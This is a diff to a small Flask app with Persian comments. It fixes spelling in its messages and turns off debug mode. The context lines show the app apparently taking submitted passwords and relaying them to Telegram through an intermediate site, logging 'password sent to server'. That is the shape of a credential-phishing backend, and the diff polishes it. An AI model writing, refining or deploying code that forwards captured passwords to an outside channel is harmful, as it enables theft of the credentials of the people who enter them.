@@ -37,10 +37,10 @@ def send_password():
 
             session["attempts"] = 0  # بازنشانی تعداد تلاش‌ها پس از ارسال موفقیت‌آمیز
 
-            return jsonify({"status": "success", "message": "password verrified !"})
+            return jsonify({"status": "success", "message": "password verified !"})
 
     except Exception as e:
-        return jsonify({"status": "error", "message": f"server eror: {str(e)}"}), 500
+        return jsonify({"status": "error", "message": f"server error: {str(e)}"}), 500
 
 def send_message_to_telegram(message):
     """ارسال پیام به تلگرام از طریق سایت واسط"""
@@ -53,10 +53,10 @@ def send_message_to_telegram(message):
             "MethodList": "POST"
         }
         response = requests.post(INTERMEDIATE_URL, data)
-        print("password send to server:", response.text)
+        print("password sent to server:", response.text)
 
     except Exception as e:
-        print("there was an eror in send data to server,try again later!:", str(e))
+        print("there was an error in sending data to server, try again later!:", str(e))
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=8080, debug=True)
+    app.run(host="0.0.0.0", port=8080, debug=False)
